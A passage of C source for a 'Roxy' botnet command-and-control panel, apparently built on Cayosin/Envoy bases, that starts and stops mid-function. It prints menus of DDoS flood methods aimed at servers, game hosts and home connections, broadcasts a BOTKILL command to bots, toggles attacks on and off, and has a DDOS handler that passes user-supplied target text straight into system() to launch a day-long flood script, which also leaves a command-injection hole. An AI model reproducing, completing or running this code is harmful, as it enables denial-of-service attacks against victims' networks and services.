				if(send(datafd, featurev2,  strlen(featurev2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev3,  strlen(featurev3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev4,  strlen(featurev4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev5,  strlen(featurev5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev6,  strlen(featurev6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev7,  strlen(featurev7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev8,  strlen(featurev8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev9,  strlen(featurev9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev10,  strlen(featurev10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurev11,  strlen(featurev11), MSG_NOSIGNAL) == -1) goto end;



				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		 		 		if(strstr(buf, "SPOOF") || strstr(buf, "spoof") || strstr(buf, "Spoof")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char featurep1  [800];
				char featurep2  [800];
				char featurep3  [800];
				char featurep4  [800];
				char featurep5  [800];
				char featurep6  [800];

				/*
                Welcome To Envoy CNC Where All The ModemOligest come to Slay the devices
				
				Credts to [@oplollie @uqtss]- Cayosin Devs!!  [Credits to @_treqity]for CNC Base 
				*/

				sprintf(featurep1,  "\x1b[0;38;5;218m   ╔══════════════════╗\r\n");
				sprintf(featurep2,  "\x1b[0;38;5;218m   ║\x1b[1;91mIRAN-Not Working  \x1b[0;38;5;218m║\r\n");
				sprintf(featurep3,  "\x1b[0;38;5;218m   ║\x1b[1;91mSPOT-Not Working  \x1b[0;38;5;218m║\r\n");
				sprintf(featurep4,  "\x1b[0;38;5;218m   ║\x1b[1;91mCRASH-Not Working \x1b[0;38;5;218m║\r\n");
				sprintf(featurep5,  "\x1b[0;38;5;218m   ║\x1b[1;91mJUMP-Not Working  \x1b[0;38;5;218m║\r\n");
				sprintf(featurep6,  "\x1b[0;38;5;218m   ╚══════════════════╝\r\n");


                sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, featurep1,  strlen(featurep1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurep2,  strlen(featurep2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurep3,  strlen(featurep3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurep4,  strlen(featurep4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurep5,  strlen(featurep5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featurep6,  strlen(featurep6), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		 		if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char features1  [800];
				char features2  [800];
				char features3  [800];
				char features4  [800];
				char features5  [800];
				char features6  [800];
				char features7  [800];
				char features8  [800];
				char features9  [800];
				char features10 [800];
				char features11 [800];
				char features12 [800];
			    char features13 [800];
			    char features14 [800];
			    char features15 [800];
						     
				sprintf(features1,  "\033[1;33m             ╔═════════════════════\033[1;34m════════════════════╗\r\n"); // wheres your bot at
				sprintf(features2,  "\033[1;33m             ║ \033[1;37m☆METHODS -  shows  list of methods      \033[1;34m║\r\n");
				sprintf(features3,  "\033[1;33m             ║ \033[1;37m☆WEBSITE  -  Show Website Methods       \033[1;34m║\r\n");
				sprintf(features4,  "\033[1;33m             ║ \033[1;37m☆API -  Shows all Server/API attacks    \033[1;34m║\r\n");
				sprintf(features5,  "\033[1;33m             ║ \033[1;37m☆AMP -  Shows AMP METHOD/CF-BYPASS      \033[1;34m║\r\n");
				sprintf(features6,  "\033[1;33m             ║ \033[1;37m☆RULES -  Read if you dont get banned   \033[1;34m║\r\n");
				sprintf(features7,  "\033[1;33m             ║ \033[1;37m☆CLS -  Clears the terminal             \033[1;34m║\r\n");
				sprintf(features8,  "\033[1;33m             ║ \033[1;37m☆NEWS -  Exits from the terminal        \033[1;34m║\r\n");
				sprintf(features9,  "\033[1;33m             ║ \033[1;37m☆MYDM -  To Text Other Users On The Net \033[1;34m║\r\n");
				sprintf(features10, "\033[1;33m             ║ \033[1;37m☆BANNERS -  Shows All Roxy Banners      \033[1;34m║\r\n");
				sprintf(features10, "\033[1;33m             ║ \033[1;37m☆CHECKIT -  Tells You If Attacks Are ON \033[1;34m║\r\n");
				sprintf(features11, "\033[1;33m             ╚══╦══════════════════\033[1;34m═════════════════╦══╝\r\n");
				sprintf(features12, "\033[1;33m             ╔══╩══════════════════\033[1;34m═════════════════╩══╗\r\n");
				sprintf(features13, "\033[1;33m             ║        \033[1;37m☆developed by @Fuaming           \033[1;34m║\r\n");
				sprintf(features14, "\033[1;33m             ║          \033[1;37m☆OS system [ Centos 7 ]        \033[1;34m║\r\n");
				sprintf(features15, "\033[1;33m             ╚═════════════════════\033[1;34m════════════════════╝\r\n");
				
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, features1,  strlen(features1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features2,  strlen(features2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features3,  strlen(features3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features4,  strlen(features4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features5,  strlen(features5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features6,  strlen(features6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features7,  strlen(features7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features8,  strlen(features8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features9,  strlen(features9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features10,  strlen(features10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features11,  strlen(features11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features12,  strlen(features12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features13,  strlen(features13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features14,  strlen(features14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features15,  strlen(features15), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m[\e[1;93mRoxy Help Menu\e[91m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end; 
				continue;
			}
			if(strstr(buf, "!* BOTKILL")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL\r\n");
				broadcast(buf, datafd, gtfomynet);
				continue;
			}
			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "CLS") || strstr(buf, "cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		        if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
					
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "DDOS")) { // wht is thhis  just a lil perl script i took of a source to use as a home holder but dont work
				char *token = strtok(buf, " ");
				char *attackinfo = token+sizeof(token);
				trim(attackinfo);
				char *ainfo[50];
				sprintf(ainfo, "tmux new-session -d 'python DDOS '%s' 80 86400'", attackinfo); //if you want to change the hit time, change the "20" (time is in seconds)
				printf("User [\e[32m%s\e[97m] Used the DDoS Script on IP: %s\n ", login_infos[find_line].id, attackinfo);
				sprintf(botnet, "Attack sent to \e[38;5;196m%s\r\n", attackinfo);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				while(1) {
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				system(ainfo);
				break;
				}
				continue;
				}		
            if(strstr(buf, "METHODS") || strstr(buf, "Methods") || strstr(buf, "methods")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char News1  [800];
				char News2  [800];
				char News3  [800];
				char News4  [800];
				char News5  [800];
				char News6  [800];
				char News7  [800];
				char News8  [800];
				char News9  [800];
				char News10  [800];
				char News11  [800];
				char News12  [800];
				char News13  [800];
				char News14  [800];
				char News15  [800];
				char News16  [800];
				char News17  [800];
				char News18  [800];
				char News19  [800];
				char News20  [800];
				
			   	sprintf(News1,  "\x1b[1;93m╔═════════════════════════════════╗\r\n");
                 sprintf(News2, "\x1b[1;93m║\x1b[1;97m             Bypasses            \x1b[1;93m║\r\n");
                 sprintf(News3, "\x1b[1;93m║═════════════════════════════════║  \x1b[1;91m╔═════════════════════════════════╗\r\n");
                 sprintf(News4, "\x1b[1;93m║. fuze IP PORT TIME              ║  \x1b[1;91m║\x1b[1;97m             Hex Strips          \x1b[1;91m║\r\n");
                 sprintf(News5, "\x1b[1;93m║. nfov6 IP PORT TIME             ║  \x1b[1;91m║═════════════════════════════════║\r\n");
                 sprintf(News6, "\x1b[1;93m║. kill IP PORT TIME              ║  \x1b[1;91m║. std IP PORT TIME               ║\r\n");
                 sprintf(News7, "\x1b[1;93m║. udprape IP PORT TIME           ║  \x1b[1;91m║. cuh IP PORT TIME               ║\r\n");
                 sprintf(News8, "\x1b[1;93m║. ovh-tcp IP PORT TIME           ║  \x1b[1;91m║. hydra IP PORT TIME             ║\r\n");
                 sprintf(News9, "\x1b[1;93m║. arcade IP PORT TIME            ║  \x1b[1;91m╚═════════════════════════════════╝\r\n");
                sprintf(News10, "\x1b[1;93m║. choopa IP PORT TIME            ║  \x1b[1;96m╔═════════════════════════════════╗\r\n");  
                sprintf(News11, "\x1b[1;93m║. hotspot IP PORT TIME           ║  \x1b[1;96m║\x1b[1;97m           Home Methods          \x1b[1;96m║\r\n");
                sprintf(News12, "\x1b[1;93m║. hydrasyn IP PORT TIME          ║  \x1b[1;96m║═════════════════════════════════║\r\n");
                sprintf(News13, "\x1b[1;93m╚═════════════════════════════════╝  \x1b[1;96m║. wifi IP PORT TIME              ║\r\n");
                sprintf(News14, "\x1b[1;94m╔═════════════════════════════════╗  \x1b[1;96m║. fuck IP PORT TIME              ║\r\n");
                sprintf(News15, "\x1b[1;94m║\x1b[1;97m         Game Bypasses           \x1b[1;94m║  \x1b[1;96m║. shit IP PORT TIME              ║\r\n");
                sprintf(News16, "\x1b[1;94m║═════════════════════════════════║  \x1b[1;96m║. cunt IP PORT TIME              ║\r\n");
                sprintf(News17, "\x1b[1;94m║. fn IP PORT TIME 32 1024 10     ║  \x1b[1;96m║. kys IP PORT TIME               ║\r\n");
                sprintf(News18, "\x1b[1;94m║. bo4 IP PORT TIME 32 1024 10    ║  \x1b[1;96m╚═════════════════════════════════╝\r\n");
                sprintf(News19, "\x1b[1;94m║. r6 IP PORT TIME 32 1024 10     ║\r\n");
                sprintf(News20, "\x1b[1;94m╚═════════════════════════════════╝\r\n");
				
				if(send(datafd, News1, strlen(News1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News2, strlen(News2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News3, strlen(News3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News4, strlen(News4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News5, strlen(News5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News6, strlen(News6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News7, strlen(News7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News8, strlen(News8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News9, strlen(News9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News10, strlen(News10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News11, strlen(News11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News12, strlen(News12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News13, strlen(News13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News14, strlen(News14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News15, strlen(News15), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News16, strlen(News16), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News17, strlen(News17), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News18, strlen(News18), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News19, strlen(News19), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, News20, strlen(News20), MSG_NOSIGNAL) == -1) goto end;
				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			
                if(strstr(buf, "floodon") || strstr(buf, "FLOODON")) // compile and test 
                {
                sprintf(botnet, "\e[37mAttacks \e[37mNow \e[1;32mEnabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 0; // <-- 1 = off , 0 = on
                }
    
                if(strstr(buf, "floodoff") || strstr(buf, "FLOODOFF")) // well this source doesnt have an admin, so you will have to make the keyqword somethinsg secret  
                {
                sprintf(botnet, "\e[37mAttacks \e[37mNow \e[1;31mDisabled!\e[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 1; // <-- 1 = off , 0 = on
                }


            if(strstr(buf, "mydm") || strstr(buf, "MYDM"))
            {
            	int myid;
            	char user[50];
            	sprintf(botnet, "\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\e[37mEnter Username To Message: ");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                strcpy(user,buf);
                sprintf(botnet, "\e[37mEnter \e[37mMessage: ");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                char msg[1024];
                strcpy(msg,buf);
                trim(buf);
                sprintf(botnet, "\e[37mMessage \e[37mSent \e[37mTo\e[37m: \e[1;34m%s\r\n", user); // ok there 
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                for(myid=0; myid < MAXFDS; myid++)
                {
                if(managements[myid].connected)
                if(!strcmp(user, login_infos[myid].id)) 
                {
                    sprintf(botnet, "\e[1;34m%s \e[37mMessaged \e[37mYou\e[1;34m: \e[1;34m'\e[37m%s\e[1;34m'\r\n", login_infos[datafd].id, msg);
                    if(send(myid, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            memset(buf,0,sizeof(buf)); 
        }

            if(strstr(buf, "CHECKIT"))
            {
            	checkmyfloods(datafd);
            }

            if(strstr(buf, ".")) 
            
            if(checkfloods == 1)
            {
            	char roxy[50];
            	sprintf(roxy, "\e[1;31mAttacks Have Been Disabled\r\n");
            	if(send(datafd, roxy, strlen(roxy), MSG_NOSIGNAL) == -1) goto end;
            	sleep(3);
            	goto Banner;
            }

			if(strstr(buf, "HOoikhME") || strstr(buf, "hohikoljme") || strstr(buf, "Homlhije")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Port1  [800];
				char Port2  [800];
				char Port3  [800];
				char Port4  [800];
				char Port5  [800];
				char Port6  [800];
				char Port7  [800];
				char Port8  [800];
				char Port9  [800];
				char Port10  [800];
				
				sprintf(Port1, "\x1b[1;96m             ╔════════════════════════════════════════════════╗\r\n");
                sprintf(Port2, "\x1b[1;96m             ║\x1b[90mThis Is Home Holding Plan Attack Over           \x1b[1;96m║\r\n");
                sprintf(Port3, "\x1b[1;96m             ║\x1b[90mYour sucluded plan Any Over = Ban               \x1b[1;96m║\r\n");
                sprintf(Port4, "\x1b[1;96m             ║════════════════════════════════════════════════║\r\n");
                sprintf(Port5, "\x1b[1;96m             ║\x1b[90m . wifi IP PORT TIME                           ☆\x1b[1;96m║\r\n");
                sprintf(Port6, "\x1b[1;96m             ║\x1b[90m . kys IP PORT TIME                            ☆\x1b[1;96m║\r\n");
                sprintf(Port7, "\x1b[1;96m             ║\x1b[90m . fuck IP PORT TIME                           ☆\x1b[1;96m║\r\n");
                sprintf(Port8, "\x1b[1;96m             ║\x1b[90m . shit IP PORT TIME                           ☆\x1b[1;96m║\r\n");
                sprintf(Port9, "\x1b[1;96m             ║\x1b[90m . cunt IP PORT TIME                           ☆\x1b[1;96m║\r\n");
                sprintf(Port10,"\x1b[1;96m             ╚════════════════════════════════════════════════╝\r\n");
				
				if(send(datafd, Port1, strlen(Port1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port2, strlen(Port2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port3, strlen(Port3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port4, strlen(Port4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port5, strlen(Port5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port6, strlen(Port6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port7, strlen(Port7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port8, strlen(Port8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port9, strlen(Port9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Port10, strlen(Port10), MSG_NOSIGNAL) == -1) goto end;

				while(1) {
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			} 
               if(strstr(buf, "CREDITS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Banners1  [800];
				char Banners2  [800];
				char Banners3  [800];
				char Banners4  [800];
				char Banners5  [800];
				char Banners6  [800];
				char Banners7  [800];

				
				sprintf(Banners1, "\x1b[1;96m             ╔═══════════════════╗\r\n");
                sprintf(Banners2, "\x1b[1;96m             ║\x1b[90m @Fuaming☆        \x1b[1;96m ║\r\n");
                sprintf(Banners3, "\x1b[1;96m             ║\x1b[90m @tcp.attack☆     \x1b[1;96m ║\r\n");
                sprintf(Banners4, "\x1b[1;96m             ║\x1b[90m @_treqity☆       \x1b[1;96m ║\r\n");
                sprintf(Banners5, "\x1b[1;96m             ║\x1b[90m @ylww__☆         \x1b[1;96m ║\r\n");
                sprintf(Banners6, "\x1b[1;96m             ╚═══════════════════╝\r\n");
				
				if(send(datafd, Banners1, strlen(Banners1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners2, strlen(Banners2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners3, strlen(Banners3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners4, strlen(Banners4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners5, strlen(Banners5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners6, strlen(Banners6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Banners7, strlen(Banners7), MSG_NOSIGNAL) == -1) goto end;

				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}		
			if(strstr(buf, "PRIVguykATE") || strstr(buf,"privakguyte" ) || strstr(buf, "Prigkuyvate")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Bannerz1  [800];
				char Bannerz2  [800];
				char Bannerz3  [800];
				char Bannerz4  [800];
				char Bannerz5  [800];
				char Bannerz6  [800];
                char Bannerz7  [800];
                char Bannerz8  [800];
                char Bannerz9  [800];
                char Bannerz10  [800];
                char Bannerz11  [800];
                char Bannerz12  [800];
                char Bannerz13  [800];
                char Bannerz14  [800];
                char Bannerz15  [800];
                char Bannerz16  [800];
                char Bannerz17  [800];
                char Bannerz18  [800];
                char Bannerz19  [800];
                char Bannerz20  [800];
                char Bannerz21  [800];

				sprintf(Bannerz1, "\x1b[1;96m            ╔═════════════════════════════════════════╗\r\n");
                sprintf(Bannerz2, "\x1b[1;96m            ║\x1b[1;90m . std [IP] [PORT] [TIME]               ☆\x1b[1;96m║\r\n");
                sprintf(Bannerz3, "\x1b[1;96m            ║\x1b[1;90m . fuze [IP] [PORT] [TIME]              ☆\x1b[1;96m║\r\n");
                sprintf(Bannerz4, "\x1b[1;96m            ║\x1b[1;90m . nfov6 [IP] [PORT] [TIME]             ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz5,  "\x1b[1;96m            ║\x1b[1;90m . hydra [IP] [PORT] [TIME]             ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz6,  "\x1b[1;96m            ║\x1b[1;90m . udprape [IP] [PORT] [TIME]           ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz7,  "\x1b[1;96m            ║\x1b[1;90m . ovhraw [IP] [PORT] [TIME]            ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz8,  "\x1b[1;96m            ║\x1b[1;90m . ovhhex  [IP] [PORT] [TIME]           ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz9,  "\x1b[1;96m            ║\x1b[1;90m . ovhfuze [IP] [PORT] [TIME]           ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz10, "\x1b[1;96m            ║\x1b[1;90m . killallv2 [IP] [PORT] [TIME]         ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz11, "\x1b[1;96m            ║\x1b[1;90m . killallv3 [IP] [PORT] [TIME]         ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz12, "\x1b[1;96m            ║\x1b[1;90m . tcprape [IP] [PORT] [TIME]           ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz13, "\x1b[1;96m            ║\x1b[1;90m . choopa [IP] [PORT] [TIME]            ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz14, "\x1b[1;96m            ║\x1b[1;90m . hotspot [IP] [PORT] [TIME]           ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz16, "\x1b[1;96m            ║\x1b[1;90m . hydra [IP] [PORT] [TIME]             ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz17, "\x1b[1;96m            ║\x1b[1;90m . lagout [IP] [PORT] [TIME]            ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz18, "\x1b[1;96m            ║\x1b[1;90m . ovhexp [IP] [PORT] [TIME]            ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz19, "\x1b[1;96m            ║\x1b[1;90m . layer7 [IP] [PORT] [TIME]            ☆\x1b[1;96m║\r\n");
               sprintf(Bannerz20, "\x1b[1;96m            ║\x1b[1;90m . hydrasyn [IP] [PORT] [TIME]          ☆\x1b[1;96m║\r\n");
		       sprintf(Bannerz21, "\x1b[1;96m            ╚═════════════════════════════════════════╝\r\n");                                     
				
				if(send(datafd, Bannerz1, strlen(Bannerz1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz2, strlen(Bannerz2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz3, strlen(Bannerz3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz4, strlen(Bannerz4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz5, strlen(Bannerz5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz6, strlen(Bannerz6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz7, strlen(Bannerz7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz8, strlen(Bannerz8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz9, strlen(Bannerz9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz10, strlen(Bannerz10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz11, strlen(Bannerz11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz12, strlen(Bannerz12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz13, strlen(Bannerz13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz14, strlen(Bannerz14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz15, strlen(Bannerz15), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz16, strlen(Bannerz16), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz17, strlen(Bannerz17), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz18, strlen(Bannerz18), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz19, strlen(Bannerz19), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz20, strlen(Bannerz20), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Bannerz21, strlen(Bannerz21), MSG_NOSIGNAL) == -1) goto end;



				while(1) {			
			char input [5000];
		    char input1 [5000];
